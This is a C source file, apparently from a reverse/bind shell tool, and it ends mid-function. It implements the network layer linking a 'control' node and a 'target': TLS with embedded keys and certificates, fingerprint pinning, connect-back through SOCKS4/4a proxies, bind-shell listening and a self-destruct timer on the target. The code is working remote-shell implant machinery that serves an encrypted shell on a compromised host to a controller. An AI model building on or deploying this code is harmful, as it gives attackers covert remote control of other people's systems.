
#include "common.h"
#include "keys/dh_params.c"
#include <stdio.h>
#include <string.h>

extern sig_atomic_t sig_found;


/***********************************************************************************************************************
 *
 * remote_read_plaintext()
 *
 * Input: A pointer to the buffer we want to fill, and the count of characters we should try to read.
 *   We will make use of the global io struct.
 * Output: The count of characters succesfully read, or an error code. (man BIO_read for more information.)
 *
 * Purpose: Fill our buffer, but this is the simple plaintext wrapper case. Nothing fancy here.
 *
 **********************************************************************************************************************/
int remote_read_plaintext(void *buff, size_t count){
  int retval;
  int io_bytes;
  char *tmp_ptr;

	int current_sig = 0;

  fd_set fd_select;

  int seen = 0;


  io_bytes = 0;
  tmp_ptr = buff;

  while(count){

    /* Skip the select() statement the first time through, as the common case won't need it. */
    if(seen){
      FD_ZERO(&fd_select);
      FD_SET(io->remote_fd, &fd_select);

      if((select(io->remote_fd + 1, &fd_select, NULL, NULL, NULL) == -1) && !sig_found){
				report_error("remote_read_plaintext(): select(%d, %lx, NULL, NULL, NULL): %s", \
						io->remote_fd + 1, (unsigned long) &fd_select, strerror(errno));
				return(-1);
			}

			if(sig_found){
				current_sig = sig_found;
				sig_found = 0;
				continue;
			}
		}else{
			seen = 1;
		}

		retval = BIO_read(io->connect, tmp_ptr, count);

		if(!retval){
			io->eof = 1;
			return(-1);

		}else if(retval == -1){
			if(!(errno == EINTR  || errno == EAGAIN)){
				report_error("remote_read_plaintext(): BIO_read(%lx, %lx, %d): %s", (unsigned long) io->connect, (unsigned long) &tmp_ptr, (int) count, strerror(errno));
				return(-1);
			}

		}else{
			count -= retval;
			io_bytes += retval;
			tmp_ptr += retval;
		}
	}

	if(current_sig){
		sig_found = current_sig;
	}
	return(io_bytes);
}



/***********************************************************************************************************************
 *
 * remote_write_plaintext()
 *
 * Input: A pointer to the buffer we want to empty, and the count of characters we should try to write.
 *   We will make use of the global io struct.
 * Output: The count of characters succesfully written, or an error code. (man BIO_write for more information.)
 *
 * Purpose: Empty our buffer, but this is the simple plaintext wrapper case. Nothing fancy here.
 *
 **********************************************************************************************************************/
int remote_write_plaintext(void *buff, size_t count){
	int retval;
	int io_bytes;
	char *tmp_ptr;

	fd_set fd_select;

	int seen = 0;

	int current_sig = 0;

	io_bytes = 0;
	tmp_ptr = buff;

	while(count){

		/* Skip the select() statement the first time through, as the common case won't need it. */
		if(seen){
			FD_ZERO(&fd_select);
			FD_SET(io->remote_fd, &fd_select);

			if((select(io->remote_fd + 1, NULL, &fd_select, NULL, NULL) == -1) && !sig_found){
				report_error("remote_write_plaintext(): select(%d, NULL, %lx, NULL, NULL): %s", \
						io->remote_fd + 1, (unsigned long) &fd_select, strerror(errno));
				return(-1);
			}

			if(sig_found){
				current_sig = sig_found;
				sig_found = 0;
				continue;
			}
		}else{
			seen = 1;
		}

		retval = BIO_write(io->connect, tmp_ptr, count);

		if(retval == -1){
			if(!(errno == EINTR || errno == EAGAIN)){
				report_error("remote_write_plaintext(): BIO_write(%lx, %lx, %d): %s", \
						(unsigned long) io->remote_fd, (unsigned long) &tmp_ptr, (int) count, strerror(errno));
				return(-1);
			}

		}else{
			count -= retval;
			io_bytes += retval;
			tmp_ptr += retval;
		}
	}

	if(current_sig){
		sig_found = current_sig;
	}
	return(io_bytes);
}



/***********************************************************************************************************************
 *
 * remote_read_encrypted()
 *
 * Input: A pointer to the buffer we want to fill, and the count of characters we should try to read.
 *   We will make use of the global io struct.
 * Output: The count of characters succesfully read, or an error code. (man BIO_read for more information.)
 *
 * Purpose: Fill our buffer. This is the SSL encrypted case.
 *
 * Note: This function won't return until it has satisfied the request to read count characters, or encountered an error
 *   trying. It assumes the socket is ready for action (either blocking, or has just passed a select() call.) If it 
 *   cannot fulfill the requested character count initially, it will call select() itself in a loop until it can.
 *
 **********************************************************************************************************************/
int remote_read_encrypted(void *buff, size_t count){

	int retval;
	fd_set fd_select;
	int ssl_error = SSL_ERROR_NONE;

	int current_sig = 0;

	if(!count){
		return(count);
	}

	do{
		/* We've already been through the loop once, but now we need to wait for the socket to be ready. */
		if(ssl_error != SSL_ERROR_NONE){
			FD_ZERO(&fd_select);
			FD_SET(io->remote_fd, &fd_select);

			if(ssl_error == SSL_ERROR_WANT_READ){
				if((select(io->remote_fd + 1, &fd_select, NULL, NULL, NULL) == -1) && !sig_found){
					report_error("remote_read_encrypted(): select(%d, %lx, NULL, NULL, NULL): %s", \
							io->remote_fd + 1, (unsigned long) &fd_select, strerror(errno));
					return(-1);
				}

				if(sig_found){
					current_sig = sig_found;
					sig_found = 0;
					continue;
				}

			}else /* if(ssl_error == SSL_ERROR_WANT_WRITE) */ {
				if((select(io->remote_fd + 1, NULL, &fd_select, NULL, NULL) == -1) && !sig_found){
					report_error("remote_read_encrypted(): select(%d, NULL, %lx, NULL, NULL): %s", \
							io->remote_fd + 1, (unsigned long) &fd_select, strerror(errno));
					return(-1);
				}

				if(sig_found){
					current_sig = sig_found;
					sig_found = 0;
					continue;
				}
			}
		}

		retval = SSL_read(io->ssl, buff, count);

		int ssl_errno;
		switch((ssl_errno = SSL_get_error(io->ssl, retval))){

			case SSL_ERROR_ZERO_RETURN:
				io->eof = 1;
				return(-1);

			case SSL_ERROR_NONE:
				if(current_sig){
					sig_found = current_sig;
				}
				return(retval);

			case SSL_ERROR_WANT_READ:
				ssl_error = SSL_ERROR_WANT_READ;
				break;

			case SSL_ERROR_WANT_WRITE:
				ssl_error = SSL_ERROR_WANT_WRITE;
				break;

			default:
				// If the remote client shuts down without cleanly closing the connection while we are in keepalive mode,
				// it will show up here as ssl_errno = 5 (SSL_ERROR_SYSCALL) and errno = 0. Treat this as an eof condition.
				if(!errno){
					io->eof = 1;
					return(-1);
				}
				report_error("remote_read_encrypted(): SSL_read(%lx, %lx, %d): errno -> \"%d\", ssl_errno -> \"%d\". Check <openssl/ssl.h> for detail.", \
						(unsigned long) io->ssl, (unsigned long) buff, (int) count, errno, ssl_errno);
				return(-1);
		}
	} while(ssl_error);

	report_error("remote_read_encrypted(): Should not be here!");
	return(-1);
}


/***********************************************************************************************************************
 *
 * remote_write_encrypted()
 *
 * Input: A pointer to the buffer we want to empty, and the count of characters we should try to write.
 *   We will make use of the global io struct.
 * Output: The count of characters succesfully written, or an error code. (man BIO_write for more information.)
 *
 * Purpose: Empty our buffer, but this is the simple plaintext wrapper case. Nothing fancy here.
 *
 * Note: This function won't return until it has satisfied the request to write count characters, or encountered an
 *   error trying. It assumes the socket is ready for action (either blocking, or has just passed a select() call.) If
 *   it cannot fulfill the requested character count initially, it will call select() itself in a loop until it can.
 *
 **********************************************************************************************************************/
int remote_write_encrypted(void *buff, size_t count){

	int retval;
	fd_set fd_select;
	int ssl_error = SSL_ERROR_NONE;

	int current_sig = 0;

	if(!count){
		return(count);
	}

	do{

		/* We've already been through the loop once, but now we need to wait for the socket to be ready. */
		if(ssl_error != SSL_ERROR_NONE){
			FD_ZERO(&fd_select);
			FD_SET(io->remote_fd, &fd_select);

			if(ssl_error == SSL_ERROR_WANT_READ){
				if((select(io->remote_fd + 1, &fd_select, NULL, NULL, NULL) == -1) && !sig_found){
					report_error("remote_write_encrypted(): select(%d, %lx, NULL, NULL, NULL): %s", \
							io->remote_fd + 1, (unsigned long) &fd_select, strerror(errno));
					return(-1);
				}

				if(sig_found){
					current_sig = sig_found;
					sig_found = 0;
					continue;
				}

			}else /* if(ssl_error == SSL_ERROR_WANT_WRITE) */ {
				if((select(io->remote_fd + 1, NULL, &fd_select, NULL, NULL) == -1) && !sig_found){
					report_error("remote_write_encrypted(): select(%d, NULL, %lx, NULL, NULL): %s", \
							io->remote_fd + 1, (unsigned long) &fd_select, strerror(errno));
					return(-1);
				}

				if(sig_found){
					current_sig = sig_found;
					sig_found = 0;
					continue;
				}

			}
		}

		retval = SSL_write(io->ssl, buff, count);

		int ssl_errno;
		switch((ssl_errno = SSL_get_error(io->ssl, retval))){

			case SSL_ERROR_ZERO_RETURN:
				io->eof = 1;
				return(-1);

			case SSL_ERROR_NONE:
				sig_found = current_sig;
				return(retval);

			case SSL_ERROR_WANT_READ:
				ssl_error = SSL_ERROR_WANT_READ;
				break;

			case SSL_ERROR_WANT_WRITE:
				ssl_error = SSL_ERROR_WANT_WRITE;
				break;

			default:
				// If the remote client shuts down without cleanly closing the connection while we are in keepalive mode,
				// it will show up here as ssl_errno = 5 (SSL_ERROR_SYSCALL) and errno = 0. Treat this as an eof condition.
				if(!errno){
					io->eof = 1;
					return(-1);
				}
				report_error("remote_write_encrypted(): SSL_write(%lx, %lx, %d): errno -> \"%d\", ssl_errno: \"%d\". Check <openssl/ssl.h> for detail.", \
						(unsigned long) io->ssl, (unsigned long) buff, (int) count, errno, ssl_errno);
				return(-1);
		}
	} while(ssl_error);


	report_error("remote_write_encrypted(): remote_write_encrypted(): Should not be here!");
	return(-1);
}



/***********************************************************************************************************************
 *
 * init_io_control()
 *
 * Input: None. We will use the global io and config structs.
 * Output: An int showing success (by returning the remote_fd) or failure (by returning -1).
 *
 * Purpose: To initialize the control's network io interface.
 *
 **********************************************************************************************************************/
int init_io_control(){

	int i;

	wordexp_t keys_dir_exp;

	BIO *accept = NULL;

	char *control_cert_path_head = NULL, *control_cert_path_tail = NULL;
	char *control_key_path_head = NULL, *control_key_path_tail = NULL;

	X509 *remote_cert;
	unsigned int remote_fingerprint_len;
	unsigned char remote_fingerprint[EVP_MAX_MD_SIZE];

	X509 *allowed_cert;
	unsigned int allowed_fingerprint_len;
	unsigned char allowed_fingerprint[EVP_MAX_MD_SIZE];

	FILE *target_fingerprint_fp;

	char *allowed_cert_path_head, *allowed_cert_path_tail;

	socklen_t len;
	struct sockaddr_storage addr;
	char ipstr[INET6_ADDRSTRLEN];
	int port;
	struct sockaddr_in *s;
	struct sockaddr_in6 *s6;


	/* Initialize the structures we will need. */
	if(wordexp(config->keys_dir, &keys_dir_exp, 0)){
		report_error("init_io_control(): wordexp(%s, %lx, 0): %s", \
				config->keys_dir, (unsigned long)  &keys_dir_exp, strerror(errno));
		return(-1);
	}

	if(keys_dir_exp.we_wordc != 1){
		report_error("init_io_control(): Invalid path: %s", config->keys_dir);
		return(-1);
	}

	memset(allowed_fingerprint, 0, EVP_MAX_MD_SIZE);
	allowed_fingerprint_len = 0;

	memset(remote_fingerprint, 0, EVP_MAX_MD_SIZE);
	remote_fingerprint_len = 0;


	/*  - Open a socket / setup SSL. */

	if(config->encryption){

#if	OPENSSL_VERSION_NUMBER < 0x10100000
		if((io->ctx = SSL_CTX_new(TLSv1_server_method())) == NULL){
#else
		if((io->ctx = SSL_CTX_new(TLS_server_method())) == NULL){
#endif
			report_error("init_io_control(): SSL_CTX_new(TLSv1_server_method()): %s", strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

		if((io->dh = get_dh()) == NULL){
			report_error("init_io_control(): get_dh(): %s", strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

		if(!SSL_CTX_set_tmp_dh(io->ctx, io->dh)){
			report_error("init_io_control(): SSL_CTX_set_tmp_dh(%lx, %lx): %s", (unsigned long) io->ctx, (unsigned long) io->dh, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

		if(SSL_CTX_set_cipher_list(io->ctx, config->cipher_list) != 1){
			report_error("init_io_control(): SSL_CTX_set_cipher_list(%lx, %s): %s", \
					(unsigned long) io->ctx, config->cipher_list, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

		if(config->encryption == EDH){

			if((control_cert_path_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
				report_error("init_io_control(): calloc(%d, %d): %s", PATH_MAX, (int) sizeof(char), strerror(errno));
				return(-1);
			}

			memcpy(control_cert_path_head, keys_dir_exp.we_wordv[0], strlen(keys_dir_exp.we_wordv[0]));
			control_cert_path_tail = index(control_cert_path_head, '\0');
			*(control_cert_path_tail++) = '/';
			sprintf(control_cert_path_tail, CONTROLLER_CERT_FILE);

			if((control_cert_path_head - control_cert_path_tail) > PATH_MAX){
				report_error("init_io_control(): control cert file: path too long!");
				return(-1);
			}

			if((control_key_path_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
				report_error("init_io_control(): calloc(%d, %d): %s", PATH_MAX, (int) sizeof(char), strerror(errno));
				return(-1);
			}

			memcpy(control_key_path_head, keys_dir_exp.we_wordv[0], strlen(keys_dir_exp.we_wordv[0]));
			control_key_path_tail = index(control_key_path_head, '\0');
			*(control_key_path_tail++) = '/';
			sprintf(control_key_path_tail, CONTROLLER_KEY_FILE);

			if((control_key_path_head - control_key_path_tail) > PATH_MAX){
				report_error("init_io_control(): control key file: path too long!");
				return(-1);
			}

			SSL_CTX_set_verify(io->ctx, SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT, dummy_verify_callback);

			if(SSL_CTX_use_certificate_file(io->ctx, control_cert_path_head, SSL_FILETYPE_PEM) != 1){
				report_error("init_io_control(): SSL_CTX_use_certificate_file(%lx, %s, SSL_FILETYPE_PEM): %s", \
						(unsigned long) io->ctx, control_cert_path_head, strerror(errno));
				if(verbose){
					ERR_print_errors_fp(stderr);
				}
				return(-1);
			}

			free(control_cert_path_head);

			if(SSL_CTX_use_PrivateKey_file(io->ctx, control_key_path_head, SSL_FILETYPE_PEM) != 1){
				report_error("init_io_control(): SSL_CTX_use_PrivateKey_file(%lx, %s, SSL_FILETYPE_PEM): %s", \
						(unsigned long) io->ctx, control_key_path_head, strerror(errno));
				if(verbose){
					ERR_print_errors_fp(stderr);
				}
				return(-1);
			}

			free(control_key_path_head);

			if(SSL_CTX_check_private_key(io->ctx) != 1){
				report_error("init_io_control(): SSL_CTX_check_private_key(%lx): %s", \
						(unsigned long) io->ctx, strerror(errno));
				if(verbose){
					ERR_print_errors_fp(stderr);
				}
				return(-1);
			}
		}
	}

	if(config->bindshell){

		/*  - Open a network connection back to the target. */
		if((io->connect = BIO_new_connect(config->ip_addr)) == NULL){
			report_error("init_io_control(): BIO_new_connect(%s): %s", config->ip_addr, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

		if(verbose){
			printf("Connecting to %s...", config->ip_addr);
			fflush(stdout);
		}
		report_log("Controller: Connecting to %s.", config->ip_addr);

		if((BIO_do_connect(io->connect)) != 1){
			report_error("init_io_control(): BIO_do_connect(%lx): %s", \
					(unsigned long) io->connect, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}

			// if we are in keepalive mode, this case should not be fatal.
			if(config->keepalive){
				// But we do need to set remote_fd to something sane or else we leak a fd and erroniously close STDIN during cleaning.
				if(BIO_get_fd(io->connect, &(io->remote_fd)) < 0){
					report_error("init_io_control(): BIO_get_fd(%lx, %lx): %s", (unsigned long) io->connect, (unsigned long) &(io->remote_fd), strerror(errno));
					if(verbose){
						ERR_print_errors_fp(stderr);
					}
					return(-1);
				}
				return(-2);
			}
			return(-1);
		}

	}else{

		if(verbose){
			printf("Listening on %s...", config->ip_addr);
			fflush(stdout);
		}
		report_log("Controller: Listening on %s.", config->ip_addr);

		if((accept = BIO_new_accept(config->ip_addr)) == NULL){
			report_error("init_io_control(): BIO_new_accept(%s): %s", \
					config->ip_addr, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

		if(BIO_set_bind_mode(accept, BIO_BIND_REUSEADDR) <= 0){
			report_error("init_io_control(): BIO_set_bind_mode(%lx, BIO_BIND_REUSEADDR): %s", (unsigned long) accept, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

		if(BIO_do_accept(accept) <= 0){
			report_error("init_io_control(): BIO_do_accept(%lx): %s", (unsigned long) accept, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

		// I hate OpenSSL. Why do I need BIO_do_accept() twice?? Don't know. Doesn't work without it though.
		/* Oh right, this thing:
			 BIO_do_accept() serves two functions. When it is first called, after the accept BIO has been setup, it will attempt to
			 create the accept socket and bind an address to it. Second and subsequent calls to BIO_do_accept() will await an incoming
			 connection, or request a retry in non blocking mode.
		 */
		if(BIO_do_accept(accept) <= 0){
			report_error("init_io_control(): BIO_do_accept(%lx): %s", (unsigned long) accept, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-3);
		}

		if((io->connect = BIO_pop(accept)) == NULL){
			report_error("init_io_control(): BIO_pop(%lx): %s", (unsigned long) accept, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

		BIO_free(accept);
	}

	if(BIO_get_fd(io->connect, &(io->remote_fd)) < 0){
		report_error("init_io_control(): BIO_get_fd(%lx, %lx): %s", (unsigned long) io->connect, (unsigned long) &(io->remote_fd), strerror(errno));
		if(verbose){
			ERR_print_errors_fp(stderr);
		}
		return(-1);
	}

	len = sizeof addr;
	if(getpeername(io->remote_fd, (struct sockaddr*) &addr, &len) == -1){
		report_error("init_io_control(): getpeername(%d, %lx, %lx): %s", io->remote_fd, (unsigned long) &addr, &len, strerror(errno));
	}

	if(addr.ss_family == AF_INET){
		s = (struct sockaddr_in *) &addr;
		port = ntohs(s->sin_port);
		inet_ntop(AF_INET, &s->sin_addr, ipstr, sizeof ipstr);
	}else{
		s6 = (struct sockaddr_in6 *) &addr;
		port = ntohs(s6->sin6_port);
		inet_ntop(AF_INET6, &s6->sin6_addr, ipstr, sizeof ipstr);
	}

	report_log("Controller: Connected from %s:%d.", ipstr, port);

	if(config->encryption){
		if(!(io->ssl = SSL_new(io->ctx))){
			report_error("init_io_control(): SSL_new(%lx): %s", (unsigned long) io->ctx, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

		SSL_set_bio(io->ssl, io->connect, io->connect);

		if(SSL_accept(io->ssl) < 1){
			report_error("init_io_control(): SSL_accept(%lx): %s", (unsigned long) io->ssl, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-3);
		}

		/* Check the certs. */
		if(config->encryption == EDH){
			if((allowed_cert_path_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
				report_error("init_io_control(): calloc(%d, %d): %s", PATH_MAX, (int) sizeof(char), strerror(errno));
				return(-1);
			}

			memcpy(allowed_cert_path_head, keys_dir_exp.we_wordv[0], strlen(keys_dir_exp.we_wordv[0]));
			allowed_cert_path_tail = index(allowed_cert_path_head, '\0');
			*(allowed_cert_path_tail++) = '/';
			sprintf(allowed_cert_path_tail, TARGET_CERT_FILE);
			wordfree(&keys_dir_exp);

			if((allowed_cert_path_head - allowed_cert_path_tail) > PATH_MAX){
				report_error("init_io_control(): target fingerprint file: path too long!");
				return(-1);
			}

			if((target_fingerprint_fp = fopen(allowed_cert_path_head, "r")) == NULL){
				report_error("init_io_control(): fopen(%s, 'r'): %s", allowed_cert_path_head, strerror(errno));
				return(-1);
			}

			free(allowed_cert_path_head);

			if((allowed_cert = PEM_read_X509(target_fingerprint_fp, NULL, NULL, NULL)) == NULL){
				report_error("init_io_control(): PEM_read_X509(%lx, NULL, NULL, NULL): %s", (unsigned long) target_fingerprint_fp, strerror(errno));
				if(verbose){
					ERR_print_errors_fp(stderr);
				}
				return(-1);
			}

			if(fclose(target_fingerprint_fp)){
				report_error("init_io_control(): fclose(%lx): %s", (unsigned long) target_fingerprint_fp, strerror(errno));
				return(-1);
			}

			if(!X509_digest(allowed_cert, io->fingerprint_type, allowed_fingerprint, &allowed_fingerprint_len)){
				report_error("init_io_control(): X509_digest(%lx, %lx, %lx, %lx): %s", \
						(unsigned long) allowed_cert, (unsigned long) io->fingerprint_type, (unsigned long) allowed_fingerprint, (unsigned long) &allowed_fingerprint_len, \
						strerror(errno));
				if(verbose){
					ERR_print_errors_fp(stderr);
				}
				return(-1);
			}

			if(verbose > 2){
				printf(" Remote fingerprint expected: ");
				for(i = 0; i < (int) allowed_fingerprint_len; i++){
					printf("%02x", allowed_fingerprint[i]);
				}
				printf("\n");
			}

			if((remote_cert = SSL_get_peer_certificate(io->ssl)) == NULL){
				report_error("init_io_control(): SSL_get_peer_certificate(%lx): %s", (unsigned long) io->ssl, strerror(errno));
				if(verbose){
					ERR_print_errors_fp(stderr);
				}
				return(-1);
			}

			if(!X509_digest(remote_cert, io->fingerprint_type, remote_fingerprint, &remote_fingerprint_len)){
				report_error("init_io_control(): X509_digest(%lx, %lx, %lx, %lx): %s", \
						(unsigned long) remote_cert, (unsigned long) io->fingerprint_type, (unsigned long) remote_fingerprint, (unsigned long) &remote_fingerprint_len, \
						strerror(errno));
				if(verbose){
					ERR_print_errors_fp(stderr);
				}
				return(-1);
			}

			if(verbose > 2){
				printf(" Remote fingerprint received: ");
				for(i = 0; i < (int) remote_fingerprint_len; i++){
					printf("%02x", remote_fingerprint[i]);
				}
				printf("\n");
			}

			if(allowed_fingerprint_len != remote_fingerprint_len){
				report_error("init_io_control(): Fingerprint mistmatch. Closing connection and resetting.");
				return(-3);
			}

			for(i = 0; i < (int) allowed_fingerprint_len; i++){
				if(allowed_fingerprint[i] != remote_fingerprint[i]){
					report_error("init_io_control(): Fingerprint mistmatch. Closing connection and resetting.");
					return(-3);
				}
			}
		}
	}

	return(io->remote_fd);
}


/***********************************************************************************************************************
 *
 * init_io_target()
 *
 * Input: None. We will use the global io and config structs.
 * Output: An int showing success (by returning the remote_fd) or failure (by returning -1).
 *
 * Purpose: To initialize a target's network io interface.
 *
 **********************************************************************************************************************/
int init_io_target(){

	int i;
	int child_pid = 0;

	struct sigaction act;

#include "keys/target_key.c"
	int target_key_len = sizeof(target_key);

#include "keys/target_cert.c"
	int target_cert_len = sizeof(target_cert);

#include "keys/control_fingerprint.c"
	char *remote_fingerprint_str;

	X509 *remote_cert;
	unsigned int remote_fingerprint_len;
	unsigned char remote_fingerprint[EVP_MAX_MD_SIZE];

	const SSL_CIPHER *current_cipher;

	BIO *accept = NULL;


	/* Initialize the structures we will be using. */

	memset(remote_fingerprint, 0, EVP_MAX_MD_SIZE);
	remote_fingerprint_len = 0;


	/*  - Setup SSL. */
	if(config->encryption){

#if	OPENSSL_VERSION_NUMBER < 0x10100000
		if((io->ctx = SSL_CTX_new(TLSv1_client_method())) == NULL){
#else
		if((io->ctx = SSL_CTX_new(TLS_client_method())) == NULL){
#endif
			report_error("init_io_target(): SSL_CTX_new(TLSv1_client_method()): %s", strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

		/*  Because the control node will normally dictate which crypto to use, in bind shell mode */
		/*  we will want to restrict this to only EDH from the target host. Otherwise the bind shell may */
		/*  serve a shell to any random hacker that knows how to port scan. */
		if(config->bindshell){
			config->cipher_list = CONTROLLER_CIPHER;
		}else{
			config->cipher_list = TARGET_CIPHER;
		}

		if(SSL_CTX_set_cipher_list(io->ctx, config->cipher_list) != 1){
			report_error("init_io_target(): SSL_CTX_set_cipher_list(%lx, %s): %s", (unsigned long) io->ctx, config->cipher_list, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

		SSL_CTX_set_verify(io->ctx, SSL_VERIFY_PEER, dummy_verify_callback);

		if(SSL_CTX_use_certificate_ASN1(io->ctx, target_cert_len, target_cert) != 1){
			report_error("init_io_target(): SSL_CTX_use_certificate_ASN1(%lx, %d, %lx): %s", \
					(unsigned long) io->ctx, target_cert_len, (unsigned long) target_cert, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

		if(SSL_CTX_use_RSAPrivateKey_ASN1(io->ctx, target_key, target_key_len) != 1){
			report_error("init_io_target(): SSL_CTX_use_RSAPrivateKey_ASN1(%lx, %lx, %d): %s", \
					(unsigned long) io->ctx, (unsigned long) target_key, target_key_len, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

		if(SSL_CTX_check_private_key(io->ctx) != 1){
			report_error("init_io_target(): SSL_CTX_check_private_key(%lx): %s", \
					(unsigned long) io->ctx, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}
	}

	/* Sepuku when left alone too long. */
	memset(&act, 0, sizeof(act));
	act.sa_handler = seppuku;

	if(sigaction(SIGALRM, &act, NULL) == -1){
		report_error("init_io_target(): sigaction(%d, %lx, %p): %s", SIGALRM, (unsigned long) &act, NULL, strerror(errno));
		return(-1);
	}

	alarm(config->timeout);

	if(config->bindshell){

		/*  - Listen for a connection. */

		if(verbose){
			printf("Listening on %s...", config->ip_addr);
			fflush(stdout);
		}

		if(accept){
			BIO_free(accept);
		}

		if((accept = BIO_new_accept(config->ip_addr)) == NULL){
			report_error("init_io_target(): BIO_new_accept(%s): %s", config->ip_addr, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

		if(BIO_set_bind_mode(accept, BIO_BIND_REUSEADDR) <= 0){
			report_error("nit_io_target(): BIO_set_bind_mode(%lx, BIO_BIND_REUSEADDR): %s", (unsigned long) accept, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

		if(BIO_do_accept(accept) <= 0){
			report_error("init_io_target(): BIO_do_accept(%lx): %s", (unsigned long) accept, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

		if(BIO_do_accept(accept) <= 0){
			report_error("init_io_target(): BIO_do_accept(%lx): %s", (unsigned long) accept, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

		if((io->connect = BIO_pop(accept)) == NULL){
			report_error("init_io_target(): BIO_pop(%lx): %s", (unsigned long) accept, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

		BIO_free(accept);

		if((child_pid = fork()) == -1){
			report_error("init_io_target(): fork(): %s", strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

	}else{

		/*  - Open a network connection back to the control node or proxy. */
		char *ip_addr = config->ip_addr;

		if(config->outbound_proxy_type && config->outbound_proxy_addr) {
			ip_addr = config->outbound_proxy_addr;
		}

		if((io->connect = BIO_new_connect(ip_addr)) == NULL){
			report_error("init_io_target(): BIO_new_connect(%s): %s", ip_addr, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

		if(verbose){
			printf("Connecting to %s...", ip_addr);
			fflush(stdout);
		}

		if((BIO_do_connect(io->connect)) != 1){
			report_error("init_io_target(): BIO_do_connect(%lx): %s", (unsigned long) io->connect, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}

			// if we are in keepalive mode, this case should not be fatal.
			if(config->keepalive){
				return(-2);
			}
			return(-1);
		}
	}

	act.sa_handler = SIG_DFL;

	if(sigaction(SIGALRM, &act, NULL) == -1){
		report_error("init_io_target(): sigaction(%d, %lx, %p): %s", SIGALRM, (unsigned long) &act, NULL, strerror(errno));
		return(-1);
	}

	alarm(0);

	// I am the parent. Return non-fatally so we can listen again.
	if(child_pid){
		return(-2);
	}

	if(verbose){
		printf("\tConnected!\r\n");
	}

	if(BIO_get_fd(io->connect, &(io->remote_fd)) < 0){
		report_error("init_io_target(): BIO_get_fd(%lx, %lx): %s", (unsigned long) io->connect, (unsigned long) &(io->remote_fd), strerror(errno));
		if(verbose){
			ERR_print_errors_fp(stderr);
		}
		return(-1);
	}

	// Outbound proxy connection
	if(config->outbound_proxy_type && config->outbound_proxy_addr) {

		// Outbound SOCKS4/SOCKS4A proxy
		if(strcmp(config->outbound_proxy_type, "socks4") == 0 || strcmp(config->outbound_proxy_type, "socks4a") == 0) {

			if(verbose) {
				printf("Requesting %s connection to %s...", config->outbound_proxy_type, config->ip_addr);
				fflush(stdout);
			}

			if(strcmp(config->outbound_proxy_type, "socks4") == 0) {
				// Parse control ip and port from string
				unsigned char ip[4] = {0};
				unsigned short port = 0;
				if(!parse_addr_string(config->ip_addr, ip, &port)) {
					report_error("init_io_target(): parse_addr_string");
					return(-1);
				}

				// Send socks4 connection request
				unsigned char socks_request[] = {
					0x04,			// VER: 4
					0x01,			// CMD: CONNECT
					port >> 8,		// DSTPORT
					port & 0xff,	// DSTPORT
					ip[0],			// DSTIP
					ip[1],			// DSTIP
					ip[2],			// DSTIP
					ip[3],			// DSTIP
					0x00			// ID
				};
				if(write(io->remote_fd, socks_request, sizeof(socks_request)) == -1) {
					report_error("init_io_target(): write socks4 request: %s", strerror(errno));
					return(-1);
				}
			} else if(strcmp(config->outbound_proxy_type, "socks4a") == 0) {
				// Send socks4a connection request (domain)
				char *domain = strdup(config->ip_addr);
				char *p = strchr(domain, ':');
				if (!p) {
					free(domain);
					return(-1);
				}
				*p = 0;
				unsigned short port = atoi(p+1);

				int socks4a_connection_request_len = 9 + strlen(domain) + 1;
				unsigned char *socks4a_connection_request = calloc(1, socks4a_connection_request_len + 1);
				int i = 0;
				socks4a_connection_request[i++] = 0x04;				// VER: 4
				socks4a_connection_request[i++] = 0x01;				// CMD: CONNECT
				socks4a_connection_request[i++] = port >> 8;		// DSTPORT
				socks4a_connection_request[i++] = port & 0xff;		// DSTPORT
				socks4a_connection_request[i++] = 0x00;				// DSTIP
				socks4a_connection_request[i++] = 0x00;				// DSTIP
				socks4a_connection_request[i++] = 0x00;				// DSTIP
				socks4a_connection_request[i++] = 0x01;				// DSTIP
				socks4a_connection_request[i++] = 0x00;				// ID

				for(size_t j = 0; j < strlen(domain); j++) {
					socks4a_connection_request[i++] = domain[j];
				}
				free(domain);

				if(write(io->remote_fd, socks4a_connection_request, socks4a_connection_request_len) == -1) {
					report_error("init_io_target(): write socks4a connection request (atyp 3): %s", strerror(errno));
